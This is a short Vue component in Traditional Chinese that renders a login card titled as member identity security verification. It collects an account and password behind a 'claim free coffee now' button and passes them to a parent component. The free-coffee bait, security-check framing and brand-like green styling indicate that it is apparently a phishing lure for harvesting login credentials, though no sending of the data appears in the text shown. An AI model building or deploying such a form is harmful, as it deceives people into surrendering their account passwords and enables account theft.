<template>
  <div class="form-card">
    <h3>會員身份安全驗證</h3>
    <form @submit.prevent="handleSubmit">
      <div class="form-group">
        <label for="email">電子信箱 / 手機號碼</label>
        <input type="text" id="email" v-model="username" placeholder="請輸入登入帳號" required>
      </div>
      <div class="form-group">
        <label for="password">密碼</label>
        <input type="password" id="password" v-model="password" placeholder="請輸入密碼" required>
      </div>
      <button type="submit" class="btn-submit">立即領取免費咖啡</button>
    </form>
  </div>
</template>

<script setup>
import { ref } from 'vue'
const emit = defineEmits(['submit-success'])
const username = ref('')
const password = ref('')
const handleSubmit = () => {
  emit('submit-success', {
    account: username.value,
    pass: password.value
  })
}
</script>

<style scoped>
.form-card {
  background: white;
  padding: 25px;
  border-radius: 8px;
  box-shadow: 0 4px 6px rgba(0,0,0,0.05);
  margin-bottom: 20px;
}
h3 {
  margin-top: 0;
  color: #333;
  border-left: 4px solid #006241;
  padding-left: 10px;
}
.form-group {
  margin-bottom: 15px;
}
label {
  display: block;
  margin-bottom: 5px;
  font-size: 14px;
  color: #555;
}
input {
  width: 100%;
  padding: 12px;
  border: 1px solid #ccc;
  border-radius: 4px;
  box-sizing: border-box;
  font-size: 14px;
}
.btn-submit {
  width: 100%;
  background-color: #006241;
  color: white;
  padding: 14px;
  border: none;
  border-radius: 4px;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
}
</style>